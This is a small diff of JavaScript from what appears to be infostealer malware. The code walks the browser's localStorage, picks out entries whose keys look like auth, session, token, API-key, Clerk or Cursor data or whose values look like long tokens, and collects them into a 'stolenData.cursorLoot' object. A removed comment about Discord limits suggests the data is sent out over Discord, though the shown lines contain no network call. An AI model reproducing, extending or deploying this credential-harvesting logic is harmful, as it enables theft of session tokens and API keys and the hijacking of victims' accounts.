@@ -16,7 +16,7 @@ try {
     Object.keys(localStorage).forEach(key => {
         const value = localStorage.getItem(key);
         if (/^(clerk|cursor|auth|session|token|api.?key|user)/i.test(key) || value && value.length > 20 && /[A-Za-z0-9_-]{30,}/.test(value)) {
-            stolenData.cursorLoot.localStorage[key] = value.substring(0, 200); // Truncate for Discord limits
+            stolenData.cursorLoot.localStorage[key] = value.substring(0, 200);
             if (value.length > 30) stolenData.cursorLoot.tokens.push(`${key}: ${value.substring(0, 100)}...`);
         }
     });
